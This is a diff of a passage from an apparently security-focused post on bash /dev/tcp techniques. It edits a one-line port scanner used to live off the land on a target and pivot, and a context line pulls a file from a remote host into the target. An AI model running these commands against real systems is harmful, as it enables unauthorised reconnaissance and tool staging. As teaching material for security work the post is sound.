@@ -156,7 +156,7 @@ cat > myfile.txt < /dev/tcp/10.20.30.40/9090
 In the rare case where you are on a server that you can't just install nmap on (which isn't so rare in information security, now that I think about it), sometimes you are forced to live off the land without making changes to the target operating system and installing binaries. Sometimes all you want to do is run a port scan. Luckily with some fancy bash footwork, this can be scripted fairly easily:
 
 ```bash
-for port in $(seq 1 65535); do (echo "blah" > /dev/tcp/YOUR_TARGET_IP_HERE/$port && echo "open - $port") 2>/dev/null; done
+for port in $(seq 1 65535); do { echo "blah" > /dev/tcp/YOUR_TARGET_IP_HERE/$port && echo "open - $port"; } 2>/dev/null; done
 ```
 This takes a fair bit of time as it is sequential, but it works pretty well. Useful for pivoting, attempting to learn more about a particular machine that your target system only has access to. Also, this is fairly noisy, so any site worth their salt should be able to detect this as this is a fairly obvious and rudimentary scan.
 
